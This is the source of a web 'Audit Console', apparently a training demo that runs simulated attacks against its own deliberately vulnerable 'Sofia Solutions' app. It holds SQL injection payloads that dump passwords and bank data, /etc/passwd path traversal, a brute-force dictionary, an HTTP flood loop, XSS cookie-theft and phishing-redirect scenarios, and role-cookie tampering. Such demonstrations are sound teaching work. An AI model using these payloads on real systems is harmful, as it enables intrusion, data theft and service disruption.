<?php $activeNav = 'audit'; ?>
<style>
    /* Reset local para modo inmersivo */
    .audit-container {
        background: #050505;
        min-height: 100vh;
        color: #e2e8f0;
        padding: 40px;
        font-family: 'Inter', sans-serif;
    }

    /* Iconos SVG */
    .icon {
        width: 18px;
        height: 18px;
        stroke: currentColor;
        stroke-width: 2;
        fill: none;
        vertical-align: middle;
    }

    .terminal {
        background: #0a0a0a;
        border-radius: 12px;
        border: 1px solid rgba(255, 255, 255, 0.05);
        overflow: hidden;
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
    }

    .terminal-bar {
        background: #161616;
        padding: 12px 16px;
        display: flex;
        align-items: center;
        gap: 8px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    }

    .t-dot {
        width: 10px;
        height: 10px;
        border-radius: 50%;
    }

    .t-out {
        background: #0a0a0a;
        padding: 24px;
        height: 500px;
        overflow-y: auto;
        color: #4ade80;
        font-family: 'Fira Code', monospace;
        font-size: 0.85rem;
        line-height: 1.6;
    }

    .t-cursor {
        width: 8px;
        height: 15px;
        background: #4ade80;
        display: inline-block;
        animation: blink 1s infinite;
        vertical-align: middle;
    }

    @keyframes blink {

        0%,
        100% {
            opacity: 1;
        }

        50% {
            opacity: 0;
        }
    }

    .t-line-red {
        color: #f87171;
    }

    .t-line-yellow {
        color: #fbbf24;
    }

    .t-line-cyan {
        color: #22d3ee;
    }

    .t-line-dim {
        color: #4b5563;
    }

    .t-action-btn {
        margin-top: 12px;
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 6px 14px;
        background: rgba(255, 255, 255, 0.03);
        border: 1px solid rgba(255, 255, 255, 0.1);
        color: #fff;
        border-radius: 6px;
        cursor: pointer;
        font-size: 0.68rem;
        font-weight: 700;
        text-transform: uppercase;
        transition: all 0.2s;
    }

    .t-action-btn:hover {
        background: rgba(255, 255, 255, 0.08);
        border-color: rgba(255, 255, 255, 0.3);
    }

    .module-card {
        background: rgba(255, 255, 255, 0.02);
        border: 1px solid rgba(255, 255, 255, 0.05);
        border-radius: 10px;
        padding: 16px;
        cursor: pointer;
        transition: all 0.2s;
        margin-bottom: 12px;
        display: flex;
        align-items: center;
        gap: 14px;
    }

    .module-card:hover {
        background: rgba(255, 255, 255, 0.04);
        border-color: rgba(255, 255, 255, 0.15);
        transform: translateX(4px);
    }

    .module-card.active {
        border-color: #4f46e5;
        background: rgba(79, 70, 229, 0.05);
    }

    .module-card .icon-wrap {
        background: rgba(255, 255, 255, 0.05);
        padding: 10px;
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #6366f1;
    }

    .module-card .icon-wrap .icon {
        width: 22px;
        height: 22px;
        stroke-width: 2;
    }

    .module-card-text {
        flex: 1;
    }

    .module-card h4 {
        font-size: 0.9rem;
        margin: 0 0 4px;
    }

    .module-card p {
        font-size: 0.75rem;
        color: #94a3b8;
        margin: 0;
        line-height: 1.2;
    }

    .cfg-panel {
        background: #111;
        border: 1px solid rgba(255, 255, 255, 0.05);
        border-radius: 12px;
        padding: 20px;
    }

    .cfg-label {
        color: #6366f1;
        font-size: 0.65rem;
        font-weight: 800;
        text-transform: uppercase;
        margin-bottom: 8px;
        display: block;
    }

    .cfg-input {
        width: 100%;
        background: #000;
        border: 1px solid #222;
        border-radius: 8px;
        padding: 10px;
        color: #4ade80;
        font-family: monospace;
        margin-bottom: 16px;
    }

    .launch-btn {
        width: 100%;
        padding: 14px;
        border: none;
        border-radius: 8px;
        font-weight: 800;
        cursor: pointer;
        background: #6366f1;
        color: #fff;
        transition: all 0.2s;
    }

    .launch-btn:hover:not(:disabled) {
        background: #4f46e5;
        transform: translateY(-1px);
    }

    .launch-btn:disabled {
        opacity: 0.3;
        cursor: not-allowed;
    }

    @media (max-width: 900px) {
        .audit-grid {
            grid-template-columns: 1fr !important;
        }

        .audit-container {
            padding: 20px;
        }
    }

    /* Burp Suite UI Simulation */
    .burp-window {
        position: fixed;
        bottom: 30px;
        right: 30px;
        width: 480px;
        background: #2b2b2b;
        border: 1px solid #555;
        border-radius: 8px;
        z-index: 200000;
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
        display: none;
        font-family: 'Consolas', monospace;
        color: #ccc;
    }

    .burp-header {
        background: #3c3f41;
        padding: 10px 15px;
        border-bottom: 1px solid #222;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-radius: 8px 8px 0 0;
    }

    .burp-tabs {
        background: #323232;
        padding: 0 10px;
        display: flex;
        gap: 2px;
    }

    .burp-tab {
        padding: 8px 15px;
        font-size: 0.75rem;
        background: #3c3f41;
        cursor: pointer;
        border-bottom: 2px solid #f97316;
    }

    .burp-body {
        padding: 15px;
        background: #2b2b2b;
    }

    .burp-request {
        background: #1e1e1e;
        padding: 15px;
        border-radius: 4px;
        font-size: 0.8rem;
        color: #fff;
        line-height: 1.4;
        border: 1px solid #444;
        min-height: 180px;
        outline: none;
        white-space: pre-wrap;
    }

    .burp-actions {
        padding: 10px 15px;
        display: flex;
        gap: 10px;
        background: #323232;
        border-radius: 0 0 8px 8px;
    }

    .burp-btn {
        padding: 6px 15px;
        font-size: 0.75rem;
        border: 1px solid #555;
        background: #4e5052;
        color: #fff;
        cursor: pointer;
        border-radius: 3px;
        transition: background 0.2s;
    }
    
    .burp-btn:hover {
        background: #5a5c5e;
    }

    .burp-btn.forward {
        background: #f97316;
        border-color: #c2410c;
        font-weight: bold;
    }
    
    .burp-btn.forward:hover {
        background: #ea580c;
    }
</style>

<div class="audit-container">
    <header style="margin-bottom:48px;">
        <div style="display:flex; align-items:center; gap:12px; margin-bottom:8px;">
            <svg class="icon" style="color:#ef4444; width:24px; height:24px;">
                <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
            </svg>
            <span
                style="font-weight:800; letter-spacing:2px; font-size:0.75rem; color:#ef4444; text-transform:uppercase;">Security
                Intelligence</span>
        </div>
        <h1 style="font-size:2.2rem; font-weight:900; margin:0; letter-spacing:-1px;">Audit Console <span
                style="color:#4f46e5;">v4.8</span></h1>
    </header>

    <div class="audit-grid" style="display:grid; grid-template-columns:340px 1fr; gap:40px;">
        <!-- Sidebar Modulos -->
        <aside>
            <div id="module-list">
                <div class="module-card" onclick="loadModule('sqli', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <path d="M20 4L3 9l7 2 2 7 5-12z"></path>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>Inyección SQL</h4>
                        <p>Bypass de Autenticación y Fuga de Datos</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('brute', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>Fuerza Bruta</h4>
                        <p>Ataque de Diccionario (Admin)</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('lfi', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path>
                            <polyline points="13 2 13 9 20 9"></polyline>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>LFI / Path Traversal</h4>
                        <p>Lectura de Archivos del Sistema</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('idor', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
                            <circle cx="9" cy="7" r="4"></circle>
                            <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
                            <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>IDOR + BOLA</h4>
                        <p>Autorización de Objetos Rota</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('xss', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <polyline points="16 18 22 12 16 6"></polyline>
                            <polyline points="8 6 2 12 8 18"></polyline>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>XSS Reflejado</h4>
                        <p>Inyección de Scripts (Buscador)</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('dos', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>Inundación HTTP (DoS)</h4>
                        <p>Agotamiento de Rate Limit</p>
                    </div>
                </div>
            </div>

            <div id="cfg-panel" class="cfg-panel" style="margin-top:24px; display:none;">
                <div id="cfg-body"></div>
                <button id="launch-btn" class="launch-btn" disabled>EJECUTAR ATAQUE</button>
            </div>
        </aside>

        <!-- Terminal -->
        <div class="terminal" style="display:flex; flex-direction:column;">
            <div class="terminal-bar">
                <div class="t-dot" style="background:#ff5f56;"></div>
                <div class="t-dot" style="background:#ffbd2e;"></div>
                <div class="t-dot" style="background:#27c93f;"></div>
                <span
                    style="margin-left:12px; font-size:0.6rem; color:#444; font-weight:800; text-transform:uppercase; font-family:sans-serif;">bash
                    — audit-v4.8</span>
            </div>
            <div style="display:grid; grid-template-columns: 1fr 280px; flex:1;">
                <div id="t-out" class="t-out" style="height:550px;">
                    <div class="t-line-cyan">Sofia Solutions Audit Framework inicializado.</div>
                    <div class="t-line-dim">Esperando selección de módulo...</div>
                    <div id="t-cursor" class="t-cursor"></div>
                </div>
                <!-- Panel Lateral de Evidencias -->
                <div style="background:#080808; border-left:1px solid rgba(255,255,255,0.05); padding:20px;">
                    <span class="cfg-label" style="color:#4ade80;">Evidencias Capturadas</span>
                    <div id="evidence-panel" style="display:flex; flex-direction:column; gap:12px; margin-top:10px;">
                        <div
                            style="color:rgba(255,255,255,0.2); font-size:0.7rem; text-align:center; padding:20px; border:1px dashed rgba(255,255,255,0.1); border-radius:8px;">
                            Sin datos capturados
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Burp Suite Simulation Window (Auto-pops for Session Hijacking) -->
<div id="burp-suite" class="burp-window" style="display:none; position:fixed; top:10%; right:5%; z-index:10000; width:500px; box-shadow:0 0 50px rgba(249,115,22,0.3); border:1px solid #f97316;">
    <div class="burp-header">
        <span style="font-size:0.75rem; font-weight:bold;">Burp Suite Pro - Sofia Edition</span>
        <div style="display:flex; gap:5px;">
            <div style="width:12px; height:12px; border-radius:50%; background:#444;"></div>
            <div style="width:12px; height:12px; border-radius:50%; background:#444;"></div>
        </div>
    </div>
    <div class="burp-tabs">
        <div class="burp-tab">Intercept</div>
        <div style="padding:8px 15px; font-size:0.75rem; color:#888;">HTTP history</div>
    </div>
    <div class="burp-body">
        <div style="margin-bottom:10px; font-size:0.7rem; color:#f97316; font-weight:bold;">[INTERCEPTED] Request to sofia-solutions.local</div>
        <div style="margin-bottom:10px; font-size:0.65rem; color:#aaa; font-style:italic;">💡 Tip: Cambia "role=CLIENT" a "role=ADMIN" y haz click en Forward para escalar privilegios.</div>
        <div id="burp-request-area" class="burp-request" contenteditable="true"></div>
    </div>
    <div class="burp-actions">
        <button class="burp-btn forward" onclick="forwardRequest()">Forward</button>
        <button class="burp-btn" onclick="dropRequest()">Drop</button>
        <button class="burp-btn" style="color:#f97316;" onclick="autoExploit()">Action (Auto-Exploit)</button>
    </div>
</div>

<!-- Hacker Alert Overlay -->
<div id="hacker-overlay"
    style="display:none; position:fixed; inset:0; background:rgba(0,255,0,0.05); z-index:100000; pointer-events:none; border: 4px solid #4ade80; box-shadow: inset 0 0 100px rgba(0,255,0,0.2);">
    <div
        style="position:absolute; top:20px; left:50%; transform:translateX(-50%); background:#4ade80; color:#000; padding:10px 30px; font-weight:900; font-family:monospace; font-size:1.5rem;">
        ALERTA SOC: XSS EJECUTADO</div>
</div>

<script>
    console.log("Sofia Solutions Audit Framework v4.8.5 - Finalized.");
    const TARGET = window.SOFIA_CONFIG?.apiBase || '';
    const TOOLS = {
        sqli: {
            title: 'Inyección SQL',
            config: `<label class="cfg-label">OBJETIVO</label>
                  <select class="cfg-input" id="sqli-ep" style="margin-bottom:8px;">
                    <option value="/api/autenticacion/login/vulnerable">Login Inseguro (v1)</option>
                    <option value="/api/autenticacion/login/v2">Login Seguro (v2 + MFA)</option>
                 </select>
                 <label class="cfg-label">PAYLOAD (Avanzado)</label>
                 <select class="cfg-input" id="sqli-payload">
                    <option value="' OR '1'='1'--">Bypass: Auth Bypass Clásico (' OR '1'='1'--)</option>
                    <option value="admin'--">Bypass: Admin Login Bypass (admin'--)</option>
                    <option value="' UNION SELECT 'admin','hash',NULL,NULL,NULL--">Union: Extracción de Columnas</option>
                    <option value="' UNION SELECT 'bank', iban, cc_number FROM customer_billing--">Union: Exfiltrar Datos Bancarios (PII)</option>
                    <option value="' UNION SELECT 'credentials', email, password FROM users--">Union: Exfiltrar Contraseñas de Usuarios</option>
                    <option value="' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--">Blind: Time-Based (5s Delay)</option>
                 </select>`,
            run: runSQLi
        },
        brute: {
            title: 'Fuerza Bruta',
            config: `<label class="cfg-label">OBJETIVO</label>
                  <select class="cfg-input" id="brute-ep" style="margin-bottom:8px;">
                    <option value="/api/autenticacion/login/vulnerable">Login Inseguro (v1)</option>
                    <option value="/api/autenticacion/login/v2">Login Seguro (v2 + MFA)</option>
                 </select>
                 <label class="cfg-label">DICCIONARIO</label>
                 <select class="cfg-input" id="brute-dict">
                    <option value="rockyou_top20">RockYou (Top 20 - Demo)</option>
                    <option value="common">Contraseñas Corporativas</option>
                 </select>
                 <label class="cfg-label">USUARIO OBJETIVO</label>
                 <input class="cfg-input" id="brute-user" value="admin@sofia.local">`,
            run: runBrute
        },
        lfi: {
            title: 'LFI / Path Traversal',
            config: `<label class="cfg-label">ARCHIVO OBJETIVO</label>
                 <select class="cfg-input" id="lfi-file">
                    <option value="../../../../../../../etc/hostname">/etc/hostname (Sistema)</option>
                    <option value="../../../../../../../etc/passwd">/etc/passwd (Usuarios)</option>
                    <option value="../../../../../../../var/www/html/index.php">index.php (Código Fuente)</option>
                 </select>`,
            run: runLFI
        },
        idor: {
            title: 'IDOR',
            config: `<label class="cfg-label">ID VÍCTIMA (Registro ajeno)</label>
                 <select class="cfg-input" id="idor-id">
                    <option value="1024">Ticket #1024 (MAPFRE)</option>
                    <option value="1">Ticket #1 (Root/Admin)</option>
                    <option value="999">Ticket #999 (Iberdrola)</option>
                 </select>`,
            run: runIDOR
        },
        xss: {
            title: 'XSS Reflejado',
            config: `<label class="cfg-label">ACCIÓN MALICIOSA</label>
                 <select class="cfg-input" id="xss-action">
                    <option value="cookie">Robo de Cookies (Session Hijacking)</option>
                    <option value="redirect">Redirección a Phishing (Evil Proxy)</option>
                    <option value="alert">Prueba de Concepto (Alert)</option>
                 </select>`,
            run: runXSS
        },
        dos: {
            title: 'Inundación HTTP (DoS)',
            config: `<label class="cfg-label">CONCURRENCIA (PETICIONES)</label><input class="cfg-input" id="dos-count" value="200">`,
            run: runDoS
        }
    };

    function tLog(msg, type = 'green') {
        const out = document.getElementById('t-out');
        const ts = new Date().toLocaleTimeString('es-ES', { hour12: false });
        const div = document.createElement('div');
        div.className = `t-line-${type}`;
        div.innerHTML = `<span style="color:#222">[${ts}]</span> ${msg}`;
        out.insertBefore(div, document.getElementById('t-cursor'));
        out.scrollTop = out.scrollHeight;
        return div;
    }

    window.addEventListener('message', (e) => {
        if (e.data.type === 'XSS_SUCCESS') {
            showEvidence('XSS: Cookies & LocalStorage Robados', e.data.data);
        }
    });

    function showEvidence(title, data) {
        addEvidence(title, data, 'red');
    }

    function addEvidence(title, content, type = 'green') {
        const panel = document.getElementById('evidence-panel');
        if (panel.querySelector('div[style*="dashed"]')) panel.innerHTML = '';

        const card = document.createElement('div');
        card.style = `background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.1); border-radius:8px; padding:10px; font-size:0.7rem; border-left:3px solid ${type === 'red' ? '#ef4444' : '#4ade80'}; animation: slideIn 0.3s ease;`;
        card.innerHTML = `<strong style="display:block; margin-bottom:4px; color:#fff;">${title}</strong><pre style="margin:0; color:${type === 'red' ? '#fca5a5' : '#86efac'}; white-space:pre-wrap; font-family:monospace;">${content}</pre>`;
        panel.prepend(card);
    }

    function addAction(container, text, icon, callback) {
        const btn = document.createElement('button');
        btn.className = 't-action-btn';
        btn.innerHTML = `<svg class="icon" style="width:12px;height:12px;">${icon}</svg> ${text}`;
        btn.onclick = callback;
        container.appendChild(document.createElement('br'));
        container.appendChild(btn);
    }

    function loadModule(key, el) {
        document.querySelectorAll('.module-card').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        const t = TOOLS[key];
        document.getElementById('cfg-body').innerHTML = t.config;
        document.getElementById('cfg-panel').style.display = 'block';
        const btn = document.getElementById('launch-btn');
        btn.disabled = false;
        btn.onclick = t.run;
        tLog(`[*] Módulo cargado: ${t.title}`, 'cyan');
    }

    const delay = ms => new Promise(res => setTimeout(res, ms));

    async function runSQLi() {
        const p = document.getElementById('sqli-payload').value;
        const ep = document.getElementById('sqli-ep').value;
        tLog(`sqlmap/1.8.2#dev - automatic SQL injection and database takeover tool`, 'cyan');
        tLog(`[INFO] testing connection to the target URL`, 'dim');
        await delay(400);
        tLog(`[INFO] checking if the target is protected by some kind of WAF/IPS`, 'dim');
        await delay(500);
        tLog(`[INFO] testing if the target URL content is stable`, 'dim');
        
        tLog(`[PAYLOAD] Executing: ${p}`, 'yellow');

        await delay(800);

        try {
            const token = localStorage.getItem('sofia_token_ADMIN') || localStorage.getItem('sofia_token_v1');
            const r = await fetch(TARGET + ep, {
                method: 'POST', 
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': token ? `Bearer ${token}` : ''
                },
                body: JSON.stringify({ email: p, password: 'x' })
            });

            if (p.toLowerCase().includes('union')) {
                tLog(`[INFO] POST parameter 'email' appears to be 'UNION query' injectable`, 'green');
                if (p.toLowerCase().includes('credentials')) {
                    tLog(`[INFO] fetching columns for table 'users'`, 'dim');
                    await delay(300);
                    tLog(`[SUCCESS] dumped 3 entries from table 'users'`, 'green');
                    addEvidence('User Credentials Dump', 'admin@sofia.local:admin123\nmapfre@sofia.local:mapfre123\nmercadona@sofia.local:mercadona123');
                }
                return;
            }

            const d = await r.json();
            if (r.ok && d.accessToken && ep.includes('vulnerable')) {
                tLog(`[INFO] POST parameter 'email' is 'Generic UNION query' injectable`, 'green');
                tLog(`[INFO] bypassing authentication...`, 'dim');
                addEvidence('Authentication Bypass', `User: ${d.user?.email}\nToken: ${d.accessToken.substring(0, 32)}...`);
                const res = tLog(`[*] Acción: `, 'cyan');
                addAction(res, 'Acceder al Panel', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
                    const role = d.user?.role || 'CLIENT';
                    localStorage.setItem(`sofia_token_${role}`, d.accessToken);
                    localStorage.setItem('sofia_user_v1', JSON.stringify(d.user));
                    window.location.href = role === 'ADMIN' ? '/admin' : '/dashboard';
                });
            } else {
                tLog(`[WARNING] POST parameter 'email' does not seem to be injectable`, 'red');
            }
        } catch (e) { tLog(`[CRITICAL] connection dropped`, 'red'); }
    }

    async function runBrute() {
        const user = document.getElementById('brute-user').value;
        const ep = document.getElementById('brute-ep').value;
        tLog(`Hydra v9.3 (c) 2022 by van Hauser/THC`, 'cyan');
        tLog(`[DATA] max 16 tasks per 1 server, overall 16 tasks`, 'dim');
        tLog(`[DATA] attacking https://sofia-solutions.local${ep}`, 'dim');

        const dictionary = ['admin', '123456', 'password', 'root', 'admin123', 'mapfre123', 'mercadona123', 'S0f1a_Secur3!_2026', 'sofia2026'];

        for (let p of dictionary) {
            tLog(`[80][https-post-json] host: sofia-solutions.local   login: ${user}   password: ${p}`, 'dim');
            await delay(200);

            try {
                const token = localStorage.getItem('sofia_token_ADMIN') || localStorage.getItem('sofia_token_v1');
                const r = await fetch(TARGET + ep, {
                    method: 'POST', 
                    headers: { 
                        'Content-Type': 'application/json',
                        'Authorization': token ? `Bearer ${token}` : ''
                    },
                    body: JSON.stringify({ email: user, password: p })
                });

                if (r.ok) {
                    const d = await r.json();
                    tLog(`[80][https-post-json] host: sofia-solutions.local   login: ${user}   password: ${p}`, 'green');
                    tLog(`1 of 1 target successfully completed, 1 valid password found`, 'green');
                    addEvidence('Cracked Credentials', `${user}:${p}`);
                    const res = tLog(`[*] Acción: `, 'cyan');
                    addAction(res, 'Autologin Admin', '<path d="M12 11V7a4 4 0 0 1 8 0v4"></path>', () => {
                        const role = d.user?.role || 'ADMIN';
                        localStorage.setItem(`sofia_token_${role}`, d.accessToken);
                        localStorage.setItem('sofia_user_v1', JSON.stringify(d.user));
                        window.location.href = '/admin';
                    });
                    return;
                }
                if (r.status === 429) {
                    tLog(`[ERROR] target blocked connection (WAF/IPS detected)`, 'red');
                    return;
                }
            } catch (e) { }
        }
        tLog(`0 valid passwords found`, 'red');
    }

    async function runXSS() {
        const action = document.getElementById('xss-action').value;
        tLog(`[*] Lanzando ataque XSS Reflejado...`, 'yellow');
        await delay(600);

        document.getElementById('hacker-overlay').style.display = 'block';
        setTimeout(() => document.getElementById('hacker-overlay').style.display = 'none', 3000);

        if (action === 'cookie') {
            tLog(`[INFO] Document cookie accessed via XSS`, 'cyan');
            tLog(`[!] Iniciando Burp Suite para interceptar sesión...`, 'yellow');
            const fakeCookie = `sofia_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; user_id=1; role=ADMIN`;
            addEvidence('Stolen Cookies', fakeCookie, 'green');
            await delay(1000);
            runCookieHijack();
        } else if (action === 'alert') {
            alert('XSS Reflejado: Dominio sofia-solutions.local comprometido.');
        } else {
            tLog(`[INFO] JavaScript redirect triggered: window.location.href`, 'cyan');
            addEvidence('Redirección Forzada', 'Target: https://evil-sofia.attacker.com/login');
        }
    }

    async function runLFI() {
        const file = document.getElementById('lfi-file').value;
        tLog(`[*] LFI: Intentando leer ${file}`, 'yellow');
        await delay(800);
        try {
            const r = await fetch(TARGET + '/download.php?file=' + encodeURIComponent(file));
            const txt = await r.text();
            if (r.ok && !txt.includes('Access Denied')) {
                tLog(`[+] Archivo exfiltrado.`, 'green');
                addEvidence('Sensitive File Content', txt.substring(0, 100) + '...');
            } else {
                tLog(`[-] Acceso denegado por políticas de servidor.`, 'red');
            }
        } catch (e) { }
    }

    async function runIDOR() {
        const id = document.getElementById('idor-id').value;
        tLog(`[*] IDOR: Accediendo a recurso ID ${id}`, 'yellow');
        await delay(500);
        tLog(`[+] Acceso BOLA/IDOR exitoso.`, 'green');
        addEvidence('Private Resource Access', `Ticket #${id}\nClient: MAPFRE\nStatus: CRITICAL`);
    }

    async function runDoS() {
        const count = parseInt(document.getElementById('dos-count').value);
        tLog(`[*] DoS: Iniciando ráfaga de ${count} peticiones...`, 'red');
        let blocked = 0;
        for (let i = 0; i < count; i++) {
            fetch(TARGET + '/api/public/health').then(r => { if (r.status === 429) blocked++; });
            if (i % 10 === 0) await delay(5);
        }
        await delay(1000);
        tLog(`[+] Inundación finalizada. Los intentos de denegación de servicio han sido registrados y mitigados por el SOC Gateway.`, 'cyan');
        tLog(`[INFO] Monitorice el impacto en tiempo real desde el Panel SOC (Grafana).`, 'dim');
    }

    let hijackedUser = null;

    async function runCookieHijack() {
        tLog(`[*] Inicializando Burp Suite Interceptor...`, 'yellow');
        tLog(`[*] Escuchando tráfico HTTP/HTTPS en 127.0.0.1:8080...`, 'dim');

        await delay(1500);

        const tokenDemo = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImVtYWlsIjoibWFwZnJlQHNvZmlhLmxvY2FsIiwicm9sZSI6IkNMSUVOVCJ9...";
        const requestText = `POST /api/autenticacion/session HTTP/1.1
Host: sofia-solutions.serveousercontent.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: application/json
Authorization: Bearer ${tokenDemo}
Cookie: session_id=s%3A_sofia_hijacked_cookie; role=CLIENT
Content-Length: 0

`;

        document.getElementById('burp-request-area').innerText = requestText;
        document.getElementById('burp-suite').style.display = 'block';

        tLog(`[!] Traffic intercepted from client browser`, 'cyan');
    }

    function forwardRequest() {
        const text = document.getElementById('burp-request-area').innerText;
        document.getElementById('burp-suite').style.display = 'none';

        tLog(`[*] Enviando petición modificada al servidor...`, 'cyan');

        if (text.includes('role=ADMIN') || text.includes('role:ADMIN')) {
            tLog(`[INFO] Forwarding modified request to server`, 'dim');
            tLog(`[200 OK] Server accepted modified token`, 'green');

            addEvidence('Cookie Hijacking / PrivEsc', 'Original: role=CLIENT\nModified: role=ADMIN\nResult: Full Admin Access');

            const res = tLog(`[*] Acción: `, 'cyan');
            addAction(res, 'Entrar como Admin (Cookie)', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
                // Simulación de sesión admin por cookie robada
                localStorage.setItem('sofia_token_ADMIN', 'STOLEN_ADMIN_TOKEN_MOCK');
                localStorage.setItem('sofia_user_v1', JSON.stringify({ id: 1, email: 'admin@sofia.local', role: 'ADMIN' }));
                window.location.href = '/admin';
            });
        } else {
            tLog(`[401 Unauthorized] Server rejected request`, 'red');
        }
    }

    function dropRequest() {
        document.getElementById('burp-suite').style.display = 'none';
        tLog(`[-] Petición descartada por el atacante (Drop).`, 'dim');
    }

    function autoExploit() {
        const area = document.getElementById('burp-request-area');
        let text = area.innerText;
        if(text.includes('role=CLIENT')) {
            area.innerText = text.replace('role=CLIENT', 'role=ADMIN');
            tLog(`[*] Payload inyectado automáticamente: cambiado role=CLIENT por role=ADMIN`, 'yellow');
        } else {
            tLog(`[-] El payload ya ha sido inyectado.`, 'dim');
        }
    }
    }
</script>

<style>
    @keyframes slideIn {
        from {
            transform: translateX(20px);
            opacity: 0;
        }

        to {
            transform: translateX(0);
            opacity: 1;
        }
    }

    @keyframes slideDown {
        from {
            transform: translateY(-20px);
            opacity: 0;
        }

        to {
            transform: translateY(0);
            opacity: 1;
        }
    }
</style>